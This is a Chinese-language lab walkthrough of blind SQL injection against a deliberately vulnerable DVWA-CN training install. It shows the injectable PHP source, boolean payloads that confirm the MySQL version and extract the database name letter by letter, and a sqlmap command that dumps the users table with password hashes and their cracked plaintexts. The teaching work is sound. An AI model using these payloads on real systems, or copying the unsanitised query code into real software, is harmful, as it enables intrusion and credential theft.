#dvwacn之二sql盲注

dvwacn之sql物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/sqli_blind/source# ls
high.php  low.php  medium.php
```

##安全级别

- low.php

```
<?php	

if (isset($_GET['Submit'])) {
	
	// Retrieve data
	
	$id = $_GET['id'];

	$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
	$result = mysql_query($getid); // Removed 'or die' to suppres mysql errors

	$num = @mysql_numrows($result); // The '@' character suppresses errors making the injection 'blind'

	$i = 0;

	while ($i < $num) {

		$first = mysql_result($result,$i,"first_name");
		$last = mysql_result($result,$i,"last_name");
		
		$html .= '<pre>';
		$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
		$html .= '</pre>';

		$i++;
	}
}
?>
```

- medium.php 

```
<?php

if (isset($_GET['Submit'])) {

	// Retrieve data

	$id = $_GET['id'];
	$id = mysql_real_escape_string($id);

	$getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
	$result = mysql_query($getid); // Removed 'or die' to suppres mysql errors
	
	$num = @mysql_numrows($result); // The '@' character suppresses errors making the injection 'blind'

	$i=0;

	while ($i < $num) {

		$first=mysql_result($result,$i,"first_name");
		$last=mysql_result($result,$i,"last_name");
		
		$html .= '<pre>';
		$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
		$html .= '</pre>';

		$i++;
	}
}
?>
```


- high.php

``` 
<?php	

if(isset($_GET['Submit'])){

	// Retrieve data

	$id = $_GET['id'];
	$id = stripslashes($id);
	$id = mysql_real_escape_string($id);

	if (is_numeric($id)) {

		$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
		$result = mysql_query($getid); // Removed 'or die' to suppres mysql errors

		$num = @mysql_numrows($result); // The '@' character suppresses errors making the injection 'blind'

		$i=0;

		while ($i < $num) {

			$first = mysql_result($result,$i,"first_name");
			$last = mysql_result($result,$i,"last_name");
			
			$html .= '<pre>';
			$html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
			$html .= '</pre>';

			$i++;
		}
	}
}
?>
```

实际的查询语句是

```
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

sql盲注url地址

http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/


用户ID输入：

```
1' and 1=1 and '1'='1
```

实际上拼接的sql语句是：

```
SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1 and '1'='1'
```

mysql中的查询结果是

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1 and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>
```

##测试是否有注入,对比页面返回（and 1=1）

http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%201=1%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and 1=1 and '1'='1
First name: admin
Surname: admin
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and 1=1 and '1'='1&Submit=确定
```


##测试是否有注入,对比页面返回（and 1=2）

http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%201=2%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
页面显示空白
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and 1=2 and '1'='1&Submit=确定
```

##测试数据库版本,有数据说明数据库版本为5.0


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(version(),1)=5%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(version(),1)=5 and '1'='1
First name: admin
Surname: admin
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(version(),1)=5 and '1'='1&Submit=确定
```

mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(version(),1)=4 and '1'='1';
Empty set (0.00 sec)

mysql>

mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(version(),1)=5 and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>
```

说明mysql版本是以5打头的。


###left()函数

用法

left(str, length)

返回字符串str的最左面len个字符。

```
mysql> select LEFT('www.mxnet.io', 3);
+-------------------------+
| LEFT('www.mxnet.io', 3) |
+-------------------------+
| www                     |
+-------------------------+
1 row in set (0.00 sec)

mysql> 
```

该函数是多字节可靠的。 

常用的mysql截取函数有：left(), right(), substring(), substring_index()

- 左截取left(str, length)
 
- 右截取right(str, length)

```
mysql> select right('www.mxnet.io', 2);
+--------------------------+
| right('www.mxnet.io', 2) |
+--------------------------+
| io                       |
+--------------------------+
1 row in set (0.00 sec)

mysql>
```
 
- substring(str, pos); substring(str, pos, len)

```
从第5个字符开始

mysql> select substring('www.mxnet.io', 5);
+------------------------------+
| substring('www.mxnet.io', 5) |
+------------------------------+
| mxnet.io                     |
+------------------------------+
1 row in set (0.00 sec)

从第5个字符到第7个字符

mysql> select substring('www.mxnet.io', 5,7);
+--------------------------------+
| substring('www.mxnet.io', 5,7) |
+--------------------------------+
| mxnet.i                        |
+--------------------------------+
1 row in set (0.00 sec)

倒数2个字符

mysql> select substring('www.mxnet.io', -2);
+-------------------------------+
| substring('www.mxnet.io', -2) |
+-------------------------------+
| io                            |
+-------------------------------+
1 row in set (0.00 sec)

mysql>
```

 
- substring_index(str,delim,count)

```
以.为分隔符，以此显示.分隔符前的字符

mysql> select substring_index('www.mxnet.io', '.',1);
+----------------------------------------+
| substring_index('www.mxnet.io', '.',1) |
+----------------------------------------+
| www                                    |
+----------------------------------------+
1 row in set (0.00 sec)

mysql> select substring_index('www.mxnet.io', '.',2);
+----------------------------------------+
| substring_index('www.mxnet.io', '.',2) |
+----------------------------------------+
| www.mxnet                              |
+----------------------------------------+
1 row in set (0.00 sec)

mysql> select substring_index('www.mxnet.io', '.',3);
+----------------------------------------+
| substring_index('www.mxnet.io', '.',3) |
+----------------------------------------+
| www.mxnet.io                           |
+----------------------------------------+
1 row in set (0.00 sec)

mysql>
```


 
###version()函数

显示数据库版本号

```
mysql> select version();
+-----------------------------+
| version()                   |
+-----------------------------+
| 5.5.41-0ubuntu0.14.04.1-log |
+-----------------------------+
1 row in set (0.00 sec)

mysql>
```

##测试数据库长度,有数据说明长度正确

http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())=6%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and length(database())=6 and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and length(database())=6 and '1'='1&Submit=确定
```
mysql中的查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and length(database())=6 and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>
```



###length()函数

mysql获取字符串长度函数

length:是计算字段的长度一个汉字是算三个字符,一个数字或字母算一个字符

```
mysql> select user from users where length(user)=5;
+-------+
| user  |
+-------+
| admin |
| pablo |
+-------+
2 rows in set (0.00 sec)

mysql>
```

###database()函数

显示当前数据库

```
mysql> select database();
+------------+
| database() |
+------------+
| dvwacn     |
+------------+
1 row in set (0.00 sec)

mysql> 
```


##测试数据库名称第1个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),1)=%27d%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),1)='d' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),1)='d' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),1)='d' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```



##测试数据库名称第2个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),2)=%27dv%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),1)='dv' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),2)='dv' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),2)='dv' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```


##测试数据库名称第3个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),3)=%27dvw%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),3)='dvw' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),3)='dvw' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),3)='dvw' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```


##测试数据库名称第4个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),4)=%27dvwa%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),4)='dvwa' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),4)='dvwa' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),4)='dvwa' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```



##测试数据库名称第5个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),5)=%27dvwac%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),5)='dvwac' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),5)='dvwac' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),5)='dvwac' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```



##测试数据库名称第6个字符


http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),6)=%27dvwacn%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8

```
ID: 1' and left(database(),6)='dvwacn' and '1'='1
First name: admin
Surname: admin
```

url解码后

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1' and left(database(),6)='dvwacn' and '1'='1&Submit=确定
```


mysql中查询结果

```
mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' and left(database(),6)='dvwacn' and '1'='1';
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row in set (0.00 sec)

mysql>

```

从左边起，查询当前数据库的前6个字符

```
mysql> SELECT left(database(),6);
+--------------------+
| left(database(),6) |
+--------------------+
| dvwacn             |
+--------------------+
1 row in set (0.00 sec)

mysql>
```

## sqlmap获取dvwacn.users表内容

运行命令

```
sqlmap -u "http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1&Submit=%C8%B7%B6%A8#" --cookie="security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2" --dbms=mysql -D dvwacn -T user -C --dump
```

获取到的用户名和密码

```
Database: dvwacn
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| admin   | 7fef6171469e80d32c0559f88b377245 (admin888) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```